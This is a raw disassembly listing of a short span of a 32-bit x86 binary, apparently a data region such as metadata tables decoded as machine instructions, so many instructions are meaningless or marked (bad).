  40506b:	00 fd                	add    %bh,%ch
  40506d:	1e                   	push   %ds
  40506e:	d8 1d 06 00 24 1f    	fcomps 0x1f240006
  405074:	34 01                	xor    $0x1,%al
  405076:	0a 00                	or     (%eax),%al
  405078:	81 1f 5a 1f 0a 00    	sbbl   $0xa1f5a,(%edi)
  40507e:	91                   	xchg   %eax,%ecx
  40507f:	1f                   	pop    %ds
  405080:	5a                   	pop    %edx
  405081:	1f                   	pop    %ds
  405082:	06                   	push   %es
  405083:	00 a9 1f d8 1d 0a    	add    %ch,0xa1dd81f(%ecx)
  405089:	00 d0                	add    %dl,%al
  40508b:	1f                   	pop    %ds
  40508c:	51                   	push   %ecx
  40508d:	01 0a                	add    %ecx,(%edx)
  40508f:	00 ef                	add    %ch,%bh
  405091:	1f                   	pop    %ds
  405092:	51                   	push   %ecx
  405093:	01 06                	add    %eax,(%esi)
  405095:	00 13                	add    %dl,(%ebx)
  405097:	20 34 01             	and    %dh,(%ecx,%eax,1)
  40509a:	06                   	push   %es
  40509b:	00 41 20             	add    %al,0x20(%ecx)
  40509e:	34 01                	xor    $0x1,%al
  4050a0:	06                   	push   %es
  4050a1:	00 5d 20             	add    %bl,0x20(%ebp)
  4050a4:	34 01                	xor    $0x1,%al
  4050a6:	0e                   	push   %cs
  4050a7:	00 76 20             	add    %dh,0x20(%esi)
  4050aa:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4050ab:	01 0e                	add    %ecx,(%esi)
  4050ad:	00 88 20 a7 01 06    	add    %cl,0x601a720(%eax)
  4050b3:	00 af 20 9c 20 06    	add    %ch,0x6209c20(%edi)
  4050b9:	00 c9                	add    %cl,%cl
  4050bb:	20 bf 20 06 00 ea    	and    %bh,-0x15fff9e0(%edi)
  4050c1:	20 dc                	and    %bl,%ah
  4050c3:	01 06                	add    %eax,(%esi)
  4050c5:	00 fc                	add    %bh,%ah
  4050c7:	20 bf 20 06 00 09    	and    %bh,0x9000620(%edi)
  4050cd:	21 bf 20 06 00 1e    	and    %edi,0x1e000620(%edi)
  4050d3:	21 bf 20 12 00 59    	and    %edi,0x59001220(%edi)
  4050d9:	21 3a                	and    %edi,(%edx)
  4050db:	21 12                	and    %edx,(%edx)
  4050dd:	00 5f 21             	add    %bl,0x21(%edi)
  4050e0:	3a 21                	cmp    (%ecx),%ah
  4050e2:	12 00                	adc    (%eax),%al
  4050e4:	65 21 3a             	and    %edi,%gs:(%edx)
  4050e7:	21 12                	and    %edx,(%edx)
  4050e9:	00 77 21             	add    %dh,0x21(%edi)
  4050ec:	3a 21                	cmp    (%ecx),%ah
  4050ee:	06                   	push   %es
  4050ef:	00 92 21 34 01 12    	add    %dl,0x12013421(%edx)
  4050f5:	00 af 21 3a 21 06    	add    %ch,0x6213a21(%edi)
  4050fb:	00 c9                	add    %cl,%cl
  4050fd:	21 34 01             	and    %esi,(%ecx,%eax,1)
  405100:	06                   	push   %es
  405101:	00 e8                	add    %ch,%al
  405103:	21 34 01             	and    %esi,(%ecx,%eax,1)
  405106:	0a 00                	or     (%eax),%al
  405108:	f6 21                	mulb   (%ecx)
  40510a:	51                   	push   %ecx
  40510b:	01 06                	add    %eax,(%esi)
  40510d:	00 17                	add    %dl,(%edi)
  40510f:	22 d8                	and    %al,%bl
  405111:	1d 0a 00 2a 22       	sbb    $0x222a000a,%eax
  405116:	51                   	push   %ecx
  405117:	01 0a                	add    %ecx,(%edx)
  405119:	00 58 22             	add    %bl,0x22(%eax)
  40511c:	51                   	push   %ecx
  40511d:	01 06                	add    %eax,(%esi)
  40511f:	00 7f 22             	add    %bh,0x22(%edi)
  405122:	c9                   	leave
  405123:	13 00                	adc    (%eax),%eax
  405125:	00 00                	add    %al,(%eax)
  405127:	00 01                	add    %al,(%ecx)
  405129:	00 00                	add    %al,(%eax)
  40512b:	00 00                	add    %al,(%eax)
  40512d:	00 01                	add    %al,(%ecx)
  40512f:	00 01                	add    %al,(%ecx)
  405131:	00 00                	add    %al,(%eax)
  405133:	00 10                	add    %dl,(%eax)
  405135:	00 18                	add    %bl,(%eax)
  405137:	00 28                	add    %ch,(%eax)
  405139:	00 05 00 01 00 01    	add    %al,0x1000100
  40513f:	00 0b                	add    %cl,(%ebx)
  405141:	01 11                	add    %edx,(%ecx)
  405143:	00 38                	add    %bh,(%eax)
  405145:	00 00                	add    %al,(%eax)
  405147:	00 09                	add    %cl,(%ecx)
  405149:	00 01                	add    %al,(%ecx)
  40514b:	00 04 00             	add    %al,(%eax,%eax,1)
  40514e:	03 01                	add    (%ecx),%eax
  405150:	00 00                	add    %al,(%eax)
  405152:	44                   	inc    %esp
  405153:	00 00                	add    %al,(%eax)
  405155:	00 0d 00 06 00 04    	add    %cl,0x4000600
  40515b:	00 02                	add    %al,(%edx)
  40515d:	01 00                	add    %eax,(%eax)
  40515f:	00 51 00             	add    %dl,0x0(%ecx)
  405162:	00 00                	add    %al,(%eax)
  405164:	0d 00 18 00 04       	or     $0x4001800,%eax
  405169:	00 02                	add    %al,(%edx)
  40516b:	00 10                	add    %dl,(%eax)
  40516d:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  405171:	00 05 00 21 00 04    	add    %al,0x4002100
  405177:	00 00                	add    %al,(%eax)
  405179:	00 10                	add    %dl,(%eax)
  40517b:	00 6d 00             	add    %ch,0x0(%ebp)
  40517e:	28 00                	sub    %al,(%eax)
  405180:	11 00                	adc    %eax,(%eax)
  405182:	24 00                	and    $0x0,%al
  405184:	05 00 01 00 10       	add    $0x10000100,%eax
  405189:	00 7d 00             	add    %bh,0x0(%ebp)
  40518c:	28 00                	sub    %al,(%eax)
  40518e:	05 00 27 00 1f       	add    $0x1f002700,%eax
  405193:	00 01                	add    %al,(%ecx)
  405195:	00 10                	add    %dl,(%eax)
  405197:	00 87 00 28 00 05    	add    %al,0x5002800(%edi)
  40519d:	00 27                	add    %ah,(%edi)
  40519f:	00 23                	add    %ah,(%ebx)
  4051a1:	00 01                	add    %al,(%ecx)
  4051a3:	00 10                	add    %dl,(%eax)
  4051a5:	00 92 00 28 00 05    	add    %dl,0x5002800(%edx)
  4051ab:	00 27                	add    %ah,(%edi)
  4051ad:	00 25 00 03 00 10    	add    %ah,0x10000300
  4051b3:	00 9e 00 00 00 15    	add    %bl,0x15000000(%esi)
  4051b9:	00 27                	add    %ah,(%edi)
  4051bb:	00 29                	add    %ch,(%ecx)
  4051bd:	00 01                	add    %al,(%ecx)
  4051bf:	00 10                	add    %dl,(%eax)
  4051c1:	00 ac 00 28 00 15 00 	add    %ch,0x150028(%eax,%eax,1)
  4051c8:	29 00                	sub    %eax,(%eax)
  4051ca:	2c 00                	sub    $0x0,%al
  4051cc:	0b 01                	or     (%ecx),%eax
  4051ce:	10 00                	adc    %al,(%eax)
  4051d0:	ba 00 00 00 09       	mov    $0x9000000,%edx
  4051d5:	00 2f                	add    %ch,(%edi)
  4051d7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4051da:	01 00                	add    %eax,(%eax)
  4051dc:	10 00                	adc    %al,(%eax)
  4051de:	c8 00 28 00          	enter  $0x2800,$0x0
  4051e2:	05 00 37 00 34       	add    $0x34003700,%eax
  4051e7:	00 03                	add    %al,(%ebx)
  4051e9:	01 00                	add    %eax,(%eax)
  4051eb:	00 d5                	add    %dl,%ch
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 0d 00 37 00 3a    	add    %cl,0x3a003700
  4051f5:	00 03                	add    %al,(%ebx)
  4051f7:	01 00                	add    %eax,(%eax)
  4051f9:	00 de                	add    %bl,%dh
  4051fb:	00 00                	add    %al,(%eax)
  4051fd:	00 0d 00 3d 00 3a    	add    %cl,0x3a003d00
  405203:	00 00                	add    %al,(%eax)
  405205:	00 10                	add    %dl,(%eax)
  405207:	00 e8                	add    %ch,%al
  405209:	00 28                	add    %ch,(%eax)
  40520b:	00 19                	add    %bl,(%ecx)
  40520d:	00 41 00             	add    %al,0x0(%ecx)
  405210:	3a 00                	cmp    (%eax),%al
  405212:	00 00                	add    %al,(%eax)
  405214:	10 00                	adc    %al,(%eax)
  405216:	f5                   	cmc
  405217:	00 28                	add    %ch,(%eax)
  405219:	00 1d 00 4f 00 4d    	add    %bl,0x4d004f00
  40521f:	00 02                	add    %al,(%edx)
  405221:	00 10                	add    %dl,(%eax)
  405223:	00 00                	add    %al,(%eax)
  405225:	01 00                	add    %eax,(%eax)
  405227:	00 05 00 55 00 5a    	add    %al,0x5a005500
  40522d:	00 a0 00 00 00 12    	add    %ah,0x12000000(%eax)
  405233:	01 28                	add    %ebp,(%eax)
  405235:	00 00                	add    %al,(%eax)
  405237:	00 56 00             	add    %dl,0x0(%esi)
  40523a:	6f                   	outsl  %ds:(%esi),(%dx)
  40523b:	00 00                	add    %al,(%eax)
  40523d:	00 10                	add    %dl,(%eax)
  40523f:	00 23                	add    %ah,(%ebx)
  405241:	01 28                	add    %ebp,(%eax)
  405243:	00 05 00 56 00 73    	add    %al,0x73005600
  405249:	00 03                	add    %al,(%ebx)
  40524b:	01 10                	add    %edx,(%eax)
  40524d:	00 3e                	add    %bh,(%esi)
  40524f:	1e                   	push   %ds
  405250:	00 00                	add    %al,(%eax)
  405252:	05 00 58 00 7a       	add    $0x7a005800,%eax
  405257:	00 06                	add    %al,(%esi)
  405259:	00 51 02             	add    %dl,0x2(%ecx)
  40525c:	39 00                	cmp    %eax,(%eax)
  40525e:	06                   	push   %es
  40525f:	00 58 02             	add    %bl,0x2(%eax)
  405262:	3c 00                	cmp    $0x0,%al
  405264:	06                   	push   %es
  405265:	00 63 02             	add    %ah,0x2(%ebx)
  405268:	3f                   	aas
  405269:	00 06                	add    %al,(%esi)
  40526b:	00 72 02             	add    %dh,0x2(%edx)
  40526e:	3f                   	aas
  40526f:	00 06                	add    %al,(%esi)
  405271:	00 81 02 3c 00 06    	add    %al,0x6003c02(%ecx)
  405277:	06                   	push   %es
  405278:	8b 02                	mov    (%edx),%eax
  40527a:	39 00                	cmp    %eax,(%eax)
  40527c:	56                   	push   %esi
  40527d:	80 93 02 42 00 56 80 	adcb   $0x80,0x56004202(%ebx)
  405284:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405285:	02 42 00             	add    0x0(%edx),%al
  405288:	56                   	push   %esi
  405289:	80 b5 02 42 00 56 80 	xorb   $0x80,0x56004202(%ebp)
  405290:	cb                   	lret
  405291:	02 42 00             	add    0x0(%edx),%al
  405294:	56                   	push   %esi
  405295:	80 e0 02             	and    $0x2,%al
  405298:	42                   	inc    %edx
  405299:	00 56 80             	add    %dl,-0x80(%esi)
  40529c:	f4                   	hlt
  40529d:	02 42 00             	add    0x0(%edx),%al
  4052a0:	56                   	push   %esi
  4052a1:	80 08 03             	orb    $0x3,(%eax)
  4052a4:	42                   	inc    %edx
  4052a5:	00 56 80             	add    %dl,-0x80(%esi)
  4052a8:	17                   	pop    %ss
  4052a9:	03 42 00             	add    0x0(%edx),%eax
  4052ac:	56                   	push   %esi
  4052ad:	80 29 03             	subb   $0x3,(%ecx)
  4052b0:	42                   	inc    %edx
  4052b1:	00 56 80             	add    %dl,-0x80(%esi)
  4052b4:	3a 03                	cmp    (%ebx),%al
  4052b6:	42                   	inc    %edx
  4052b7:	00 56 80             	add    %dl,-0x80(%esi)
  4052ba:	4c                   	dec    %esp
  4052bb:	03 42 00             	add    0x0(%edx),%eax
  4052be:	56                   	push   %esi
  4052bf:	80 5e 03 42          	sbbb   $0x42,0x3(%esi)
  4052c3:	00 56 80             	add    %dl,-0x80(%esi)
  4052c6:	66 03 42 00          	add    0x0(%edx),%ax
  4052ca:	56                   	push   %esi
  4052cb:	80 78 03 42          	cmpb   $0x42,0x3(%eax)
  4052cf:	00 56 80             	add    %dl,-0x80(%esi)
  4052d2:	8c 03                	mov    %es,(%ebx)
  4052d4:	42                   	inc    %edx
  4052d5:	00 56 80             	add    %dl,-0x80(%esi)
  4052d8:	a0 03 42 00 56       	mov    0x56004203,%al
  4052dd:	80 bc 03 42 00 06 06 	cmpb   $0x8b,0x6060042(%ebx,%eax,1)
  4052e4:	8b 
  4052e5:	02 39                	add    (%ecx),%bh
  4052e7:	00 56 80             	add    %dl,-0x80(%esi)
  4052ea:	ca 03 9b             	lret   $0x9b03
  4052ed:	00 56 80             	add    %dl,-0x80(%esi)
  4052f0:	d3 03                	roll   %cl,(%ebx)
  4052f2:	9b                   	fwait
  4052f3:	00 56 80             	add    %dl,-0x80(%esi)
  4052f6:	e3 03                	jecxz  0x4052fb
  4052f8:	9b                   	fwait
  4052f9:	00 56 80             	add    %dl,-0x80(%esi)
  4052fc:	ff 03                	incl   (%ebx)
  4052fe:	9b                   	fwait
  4052ff:	00 56 80             	add    %dl,-0x80(%esi)
  405302:	0f 04                	(bad)
  405304:	9b                   	fwait
  405305:	00 56 80             	add    %dl,-0x80(%esi)
  405308:	2a 04 9b             	sub    (%ebx,%ebx,4),%al
  40530b:	00 56 80             	add    %dl,-0x80(%esi)
  40530e:	44                   	inc    %esp
  40530f:	04 9b                	add    $0x9b,%al
  405311:	00 56 80             	add    %dl,-0x80(%esi)
  405314:	5c                   	pop    %esp
  405315:	04 9b                	add    $0x9b,%al
  405317:	00 06                	add    %al,(%esi)
  405319:	00 70 04             	add    %dh,0x4(%eax)
  40531c:	3f                   	aas
  40531d:	00 06                	add    %al,(%esi)
  40531f:	00 75 04             	add    %dh,0x4(%ebp)
  405322:	3f                   	aas
  405323:	00 06                	add    %al,(%esi)
  405325:	00 7e 04             	add    %bh,0x4(%esi)
  405328:	3f                   	aas
  405329:	00 01                	add    %al,(%ecx)
  40532b:	00 92 04 c7 00 01    	add    %dl,0x100c704(%edx)
  405331:	00 a5 04 c7 00 01    	add    %ah,0x100c704(%ebp)
  405337:	00 53 05             	add    %dl,0x5(%ebx)
  40533a:	f5                   	cmc
  40533b:	00 06                	add    %al,(%esi)
  40533d:	00 c1                	add    %al,%cl
  40533f:	07                   	pop    %es
  405340:	98                   	cwtl
  405341:	01 06                	add    %eax,(%esi)
  405343:	00 ce                	add    %cl,%dh
  405345:	07                   	pop    %es
  405346:	9b                   	fwait
  405347:	01 01                	add    %eax,(%ecx)
  405349:	00 0d 08 c7 00 01    	add    %cl,0x100c708
  40534f:	00 32                	add    %dh,(%edx)
  405351:	08 a6 01 01 00 38    	or     %ah,0x38000101(%esi)
  405357:	08 39                	or     %bh,(%ecx)
  405359:	00 01                	add    %al,(%ecx)
  40535b:	00 42 08             	add    %al,0x8(%edx)
  40535e:	39 00                	cmp    %eax,(%eax)
  405360:	01 00                	add    %eax,(%eax)
  405362:	4b                   	dec    %ebx
  405363:	08 98 01 01 00 74    	or     %bl,0x74000101(%eax)
  405369:	08 aa 01 03 00 01    	or     %ch,0x1000301(%edx)
  40536f:	09 d7                	or     %edx,%edi
  405371:	01 03                	add    %eax,(%ebx)
  405373:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  405376:	d7                   	xlat   %ds:(%ebx)
  405377:	01 03                	add    %eax,(%ebx)
  405379:	00 21                	add    %ah,(%ecx)
  40537b:	09 db                	or     %ebx,%ebx
  40537d:	01 03                	add    %eax,(%ebx)
  40537f:	00 30                	add    %dh,(%eax)
  405381:	09 d7                	or     %edx,%edi
  405383:	01 03                	add    %eax,(%ebx)
  405385:	00 40 09             	add    %al,0x9(%eax)
  405388:	d7                   	xlat   %ds:(%ebx)
  405389:	01 03                	add    %eax,(%ebx)
  40538b:	00 4c 09 39          	add    %cl,0x39(%ecx,%ecx,1)
  40538f:	00 03                	add    %al,(%ebx)
  405391:	00 57 09             	add    %dl,0x9(%edi)
  405394:	39 00                	cmp    %eax,(%eax)
  405396:	03 00                	add    (%eax),%eax
  405398:	68 09 39 00 06       	push   $0x6003909
  40539d:	06                   	push   %es
  40539e:	8b 02                	mov    (%edx),%eax
  4053a0:	ef                   	out    %eax,(%dx)
  4053a1:	01 56 80             	add    %edx,-0x80(%esi)
  4053a4:	be 09 f2 01 56       	mov    $0x5601f209,%esi
  4053a9:	80 d0 09             	adc    $0x9,%al
  4053ac:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  4053b0:	df 09                	fisttps (%ecx)
  4053b2:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  4053b6:	ee                   	out    %al,(%dx)
  4053b7:	09 f2                	or     %esi,%edx
  4053b9:	01 56 80             	add    %edx,-0x80(%esi)
  4053bc:	fd                   	std
  4053bd:	09 f2                	or     %esi,%edx
  4053bf:	01 06                	add    %eax,(%esi)
  4053c1:	06                   	push   %es
  4053c2:	8b 02                	mov    (%edx),%eax
  4053c4:	ef                   	out    %eax,(%dx)
  4053c5:	01 56 80             	add    %edx,-0x80(%esi)
  4053c8:	0e                   	push   %cs
  4053c9:	0a 00                	or     (%eax),%al
  4053cb:	02 56 80             	add    -0x80(%esi),%dl
  4053ce:	1f                   	pop    %ds
  4053cf:	0a 00                	or     (%eax),%al
  4053d1:	02 56 80             	add    -0x80(%esi),%dl
  4053d4:	31 0a                	xor    %ecx,(%edx)
  4053d6:	00 02                	add    %al,(%edx)
  4053d8:	01 00                	add    %eax,(%eax)
  4053da:	42                   	inc    %edx
  4053db:	0a 13                	or     (%ebx),%dl
  4053dd:	02 06                	add    (%esi),%al
  4053df:	00 48 0a             	add    %cl,0xa(%eax)
  4053e2:	c7 00 06 00 5d 0a    	movl   $0xa5d0006,(%eax)
  4053e8:	c7 00 06 00 72 0a    	movl   $0xa720006,(%eax)
  4053ee:	c7 00 06 00 89 0a    	movl   $0xa890006,(%eax)
  4053f4:	c7 00 06 00 a0 0a    	movl   $0xaa00006,(%eax)
  4053fa:	c7 00 06 00 b5 0a    	movl   $0xab50006,(%eax)
  405400:	c7 00 06 00 ca 0a    	movl   $0xaca0006,(%eax)
  405406:	c7 00 06 00 e1 0a    	movl   $0xae10006,(%eax)
  40540c:	c7 00 06 00 f8 0a    	movl   $0xaf80006,(%eax)
  405412:	c7 00 06 00 10 0b    	movl   $0xb100006,(%eax)
  405418:	c7 00 01 00 91 0b    	movl   $0xb910001,(%eax)
  40541e:	3f                   	aas
  40541f:	00 01                	add    %al,(%ecx)
  405421:	00 9c 0b 3f 00 06 00 	add    %bl,0x6003f(%ebx,%ecx,1)
  405428:	1e                   	push   %ds
  405429:	0c 63                	or     $0x63,%al
  40542b:	02 01                	add    (%ecx),%al
  40542d:	00 57 0c             	add    %dl,0xc(%edi)
  405430:	73 02                	jae    0x405434
  405432:	01 00                	add    %eax,(%eax)
  405434:	5e                   	pop    %esi
  405435:	0c 77                	or     $0x77,%al
  405437:	02 01                	add    (%ecx),%al
  405439:	00 82 0c 7b 02 01    	add    %al,0x1027b0c(%edx)
  40543f:	00 96 0c 7b 02 01    	add    %dl,0x1027b0c(%esi)
  405445:	00 b1 0c 80 02 01    	add    %dh,0x102800c(%ecx)
  40544b:	00 c6                	add    %al,%dh
  40544d:	0c 92                	or     $0x92,%al
  40544f:	02 01                	add    (%ecx),%al
  405451:	00 d0                	add    %dl,%al
  405453:	0d 77 02 01 00       	or     $0x10277,%eax
  405458:	30 10                	xor    %dl,(%eax)
  40545a:	98                   	cwtl
  40545b:	01 01                	add    %eax,(%ecx)
  40545d:	00 3b                	add    %bh,(%ebx)
  40545f:	10 39                	adc    %bh,(%ecx)
  405461:	00 06                	add    %al,(%esi)
  405463:	00 5e 0c             	add    %bl,0xc(%esi)
  405466:	77 02                	ja     0x40546a
  405468:	06                   	push   %es
  405469:	00 62 1e             	add    %ah,0x1e(%edx)
  40546c:	81 06 00 00 00 00    	addl   $0x0,(%esi)
  405472:	80 00 91             	addb   $0x91,(%eax)
  405475:	20 f6                	and    %dh,%dh
  405477:	01 13                	add    %edx,(%ebx)
  405479:	00 01                	add    %al,(%ecx)
  40547b:	00 50 20             	add    %dl,0x20(%eax)
  40547e:	00 00                	add    %al,(%eax)
  405480:	00 00                	add    %al,(%eax)
  405482:	93                   	xchg   %eax,%ebx
  405483:	00 39                	add    %bh,(%ecx)
  405485:	02 28                	add    (%eax),%ch
  405487:	00 0b                	add    %cl,(%ebx)
  405489:	00 2a                	add    %ch,(%edx)
  40548b:	21 00                	and    %eax,(%eax)
  40548d:	00 00                	add    %al,(%eax)
  40548f:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  405495:	00 11                	add    %dl,(%ecx)
  405497:	00 32                	add    %dh,(%edx)
  405499:	21 00                	and    %eax,(%eax)
  40549b:	00 00                	add    %al,(%eax)
  40549d:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  4054a3:	00 11                	add    %dl,(%ecx)
  4054a5:	00 5b 21             	add    %bl,0x21(%ebx)
  4054a8:	00 00                	add    %al,(%eax)
  4054aa:	00 00                	add    %al,(%eax)
  4054ac:	c6                   	(bad)
  4054ad:	08 b8 04 cb 00 11    	or     %bh,0x1100cb04(%eax)
  4054b3:	00 63 21             	add    %ah,0x21(%ebx)
  4054b6:	00 00                	add    %al,(%eax)
  4054b8:	00 00                	add    %al,(%eax)
  4054ba:	c6                   	(bad)
  4054bb:	08 cc                	or     %cl,%ah
  4054bd:	04 d0                	add    $0xd0,%al
  4054bf:	00 11                	add    %dl,(%ecx)
  4054c1:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 c6                	add    %al,%dh
  4054c9:	08 e5                	or     %ah,%ch
  4054cb:	04 d6                	add    $0xd6,%al
  4054cd:	00 12                	add    %dl,(%edx)
  4054cf:	00 77 21             	add    %dh,0x21(%edi)
  4054d2:	00 00                	add    %al,(%eax)
  4054d4:	00 00                	add    %al,(%eax)
  4054d6:	c6                   	(bad)
  4054d7:	08 f4                	or     %dh,%ah
  4054d9:	04 db                	add    $0xdb,%al
  4054db:	00 12                	add    %dl,(%edx)
  4054dd:	00 79 21             	add    %bh,0x21(%ecx)
  4054e0:	00 00                	add    %al,(%eax)
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	c6                   	(bad)
  4054e5:	08 0f                	or     %cl,(%edi)
  4054e7:	05 e1 00 13 00       	add    $0x1300e1,%eax
  4054ec:	82 21 00             	andb   $0x0,(%ecx)
  4054ef:	00 00                	add    %al,(%eax)
  4054f1:	00 c6                	add    %al,%dh
  4054f3:	08 22                	or     %ah,(%edx)
  4054f5:	05 e6 00 13 00       	add    $0x1300e6,%eax
  4054fa:	84 21                	test   %ah,(%ecx)
  4054fc:	00 00                	add    %al,(%eax)
  4054fe:	00 00                	add    %al,(%eax)
  405500:	c6                   	(bad)
  405501:	08 35 05 ec 00 14    	or     %dh,0x1400ec05
  405507:	00 88 21 00 00 00    	add    %cl,0x21(%eax)
  40550d:	00 c6                	add    %al,%dh
  40550f:	08 44 05 f0          	or     %al,-0x10(%ebp,%eax,1)
  405513:	00 14 00             	add    %dl,(%eax,%eax,1)
  405516:	8c 21                	mov    %fs,(%ecx)
  405518:	00 00                	add    %al,(%eax)
  40551a:	00 00                	add    %al,(%eax)
  40551c:	c6 00 62             	movb   $0x62,(%eax)
  40551f:	05 35 00 15 00       	add    $0x150035,%eax
  405524:	eb 21                	jmp    0x405547
  405526:	00 00                	add    %al,(%eax)
  405528:	00 00                	add    %al,(%eax)
  40552a:	c6                   	(bad)
  40552b:	08 73 05             	or     %dh,0x5(%ebx)
  40552e:	cb                   	lret
  40552f:	00 15 00 f3 21 00    	add    %dl,0x21f300
  405535:	00 00                	add    %al,(%eax)
  405537:	00 c6                	add    %al,%dh
  405539:	08 87 05 d0 00 15    	or     %al,0x1500d005(%edi)
  40553f:	00 fc                	add    %bh,%ah
  405541:	21 00                	and    %eax,(%eax)
  405543:	00 00                	add    %al,(%eax)
  405545:	00 c6                	add    %al,%dh
  405547:	00 b0 05 f9 00 16    	add    %dh,0x1600f905(%eax)
  40554d:	00 87 22 00 00 00    	add    %al,0x22(%edi)
  405553:	00 c6                	add    %al,%dh
  405555:	08 c2                	or     %al,%dl
  405557:	05 06 01 17 00       	add    $0x170106,%eax
  40555c:	8a 22                	mov    (%edx),%ah
  40555e:	00 00                	add    %al,(%eax)
  405560:	00 00                	add    %al,(%eax)
  405562:	c6                   	(bad)
  405563:	08 d3                	or     %dl,%bl
  405565:	05 d6 00 17 00       	add    $0x1700d6,%eax
  40556a:	98                   	cwtl
  40556b:	22 00                	and    (%eax),%al
  40556d:	00 00                	add    %al,(%eax)
  40556f:	00 c6                	add    %al,%dh
  405571:	08 ed                	or     %ch,%ch
  405573:	05 d6 00 17 00       	add    $0x1700d6,%eax
  405578:	a3 22 00 00 00       	mov    %eax,0x22
  40557d:	00 c6                	add    %al,%dh
  40557f:	00 16                	add    %dl,(%esi)
  405581:	06                   	push   %es
  405582:	0a 01                	or     (%ecx),%al
  405584:	17                   	pop    %ss
  405585:	00 cb                	add    %cl,%bl
  405587:	22 00                	and    (%eax),%al
  405589:	00 00                	add    %al,(%eax)
  40558b:	00 c6                	add    %al,%dh
  40558d:	00 1e                	add    %bl,(%esi)
  40558f:	06                   	push   %es
  405590:	11 01                	adc    %eax,(%ecx)
  405592:	18 00                	sbb    %al,(%eax)
  405594:	cd 22                	int    $0x22
  405596:	00 00                	add    %al,(%eax)
  405598:	00 00                	add    %al,(%eax)
  40559a:	c6 00 33             	movb   $0x33,(%eax)
  40559d:	06                   	push   %es
  40559e:	1d 01 1c 00 cf       	sbb    $0xcf001c01,%eax
  4055a3:	22 00                	and    (%eax),%al
  4055a5:	00 00                	add    %al,(%eax)
  4055a7:	00 c6                	add    %al,%dh
  4055a9:	00 33                	add    %dh,(%ebx)
  4055ab:	06                   	push   %es
  4055ac:	25 01 1e 00 d4       	and    $0xd4001e01,%eax
  4055b1:	22 00                	and    (%eax),%al
  4055b3:	00 00                	add    %al,(%eax)
  4055b5:	00 c6                	add    %al,%dh
  4055b7:	08 45 06             	or     %al,0x6(%ebp)
  4055ba:	e1 00                	loope  0x4055bc
  4055bc:	20 00                	and    %al,(%eax)
  4055be:	fa                   	cli
  4055bf:	22 00                	and    (%eax),%al
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 c6                	add    %al,%dh
  4055c5:	08 58 06             	or     %bl,0x6(%eax)
  4055c8:	e6 00                	out    %al,$0x0
  4055ca:	20 00                	and    %al,(%eax)
  4055cc:	fc                   	cld
  4055cd:	22 00                	and    (%eax),%al
  4055cf:	00 00                	add    %al,(%eax)
  4055d1:	00 c6                	add    %al,%dh
  4055d3:	08 6b 06             	or     %ch,0x6(%ebx)
  4055d6:	d6                   	salc
  4055d7:	00 21                	add    %ah,(%ecx)
  4055d9:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  4055dc:	00 00                	add    %al,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	c6                   	(bad)
  4055e1:	08 7a 06             	or     %bh,0x6(%edx)
  4055e4:	db 00                	fildl  (%eax)
  4055e6:	21 00                	and    %eax,(%eax)
  4055e8:	26 23 00             	and    %es:(%eax),%eax
  4055eb:	00 00                	add    %al,(%eax)
  4055ed:	00 c6                	add    %al,%dh
  4055ef:	08 89 06 33 01 22    	or     %cl,0x22013306(%ecx)
  4055f5:	00 32                	add    %dh,(%edx)
  4055f7:	23 00                	and    (%eax),%eax
  4055f9:	00 00                	add    %al,(%eax)
  4055fb:	00 c6                	add    %al,%dh
  4055fd:	08 99 06 37 01 22    	or     %bl,0x22013706(%ecx)
  405603:	00 34 23             	add    %dh,(%ebx,%eiz,1)
  405606:	00 00                	add    %al,(%eax)
  405608:	00 00                	add    %al,(%eax)
  40560a:	86 18                	xchg   %bl,(%eax)
  40560c:	4b                   	dec    %ebx
  40560d:	02 35 00 23 00 00    	add    0x2300,%dh
  405613:	00 00                	add    %al,(%eax)
  405615:	00 80 00 91 20 45    	add    %al,0x45209100(%eax)
  40561b:	07                   	pop    %es
  40561c:	57                   	push   %edi
  40561d:	01 23                	add    %esp,(%ebx)
  40561f:	00 44 23 00          	add    %al,0x0(%ebx,%eiz,1)
  405623:	00 00                	add    %al,(%eax)
  405625:	00 96 00 5f 07 5c    	add    %dl,0x5c075f00(%esi)
  40562b:	01 24 00             	add    %esp,(%eax,%eax,1)
  40562e:	b4 25                	mov    $0x25,%ah
  405630:	00 00                	add    %al,(%eax)
  405632:	00 00                	add    %al,(%eax)
  405634:	96                   	xchg   %eax,%esi
  405635:	00 5f 07             	add    %bl,0x7(%edi)
  405638:	66 01 28             	add    %bp,(%eax)
  40563b:	00 bf 25 00 00 00    	add    %bh,0x25(%edi)
  405641:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  405647:	00 2b                	add    %ch,(%ebx)
  405649:	00 c8                	add    %cl,%al
  40564b:	25 00 00 00 00       	and    $0x0,%eax
  405650:	96                   	xchg   %eax,%esi
  405651:	00 5f 07             	add    %bl,0x7(%edi)
  405654:	6f                   	outsl  %ds:(%esi),(%dx)
  405655:	01 2b                	add    %ebp,(%ebx)
  405657:	00 f8                	add    %bh,%al
  405659:	28 00                	sub    %al,(%eax)
  40565b:	00 00                	add    %al,(%eax)
  40565d:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  405663:	00 2f                	add    %ch,(%edi)
  405665:	00 00                	add    %al,(%eax)
  405667:	00 00                	add    %al,(%eax)
  405669:	00 80 00 96 20 a2    	add    %al,-0x5ddf6a00(%eax)
  40566f:	07                   	pop    %es
  405670:	7c 01                	jl     0x405673
  405672:	2f                   	das
  405673:	00 00                	add    %al,(%eax)
  405675:	29 00                	sub    %eax,(%eax)
  405677:	00 00                	add    %al,(%eax)
  405679:	00 91 00 b1 07 88    	add    %dl,-0x77f84f00(%ecx)
  40567f:	01 35 00 5c 29 00    	add    %esi,0x295c00
  405685:	00 00                	add    %al,(%eax)
